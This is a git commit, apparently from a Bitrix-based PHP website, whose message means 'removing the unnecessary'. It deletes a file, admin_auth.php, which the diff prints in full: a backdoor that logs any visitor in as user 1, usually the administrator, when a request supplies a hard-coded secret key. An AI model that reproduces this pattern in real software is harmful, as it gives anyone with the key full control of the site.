3cdeb3bce4b65809efcac7207ecca9ea8f3aeadb
Сухомлин <g.sukhomlin@skillline.ru>
2022-10-11 11:18:44 +0200

    Удаление лишнего

--- admin_auth.php
+++
@@ -1,5 +0,0 @@
-<?php
-require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
-global $USER;
-if ($_REQUEST['key'] === '(*HPIHHUKJH&(78tG*Fg') $USER->Authorize(1);
-require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
